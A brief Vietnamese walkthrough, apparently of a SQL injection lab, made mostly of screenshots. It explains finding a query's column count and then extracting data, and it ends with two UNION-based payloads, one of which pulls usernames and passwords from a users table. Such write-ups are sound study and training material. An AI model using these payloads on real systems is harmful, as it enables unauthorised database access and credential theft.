![image](https://github.com/user-attachments/assets/dd149e69-854a-4b71-af22-d3023e431ec1)

![image](https://github.com/user-attachments/assets/3b48dbed-97ab-42fc-bffd-cd9583bd4cbc)

![image](https://github.com/user-attachments/assets/55c92c06-94c6-4407-9d87-c2e099987f22)

Ta xác định được trong câu query có 2 cột.

![image](https://github.com/user-attachments/assets/a1f819ff-a63e-4108-b166-470480767e04)

Nó đã cho chúng ta cột và bảng rồi, giờ chỉ việc lấy và query vào thôi :"))

![image](https://github.com/user-attachments/assets/a81dfe16-acd6-4001-a4ab-7542c3426c2d)

Vậy là thành công.

Payload:

```
'union+select+null,null,null--%2b
'+UNION+SELECT+username,+password+FROM+users--
```
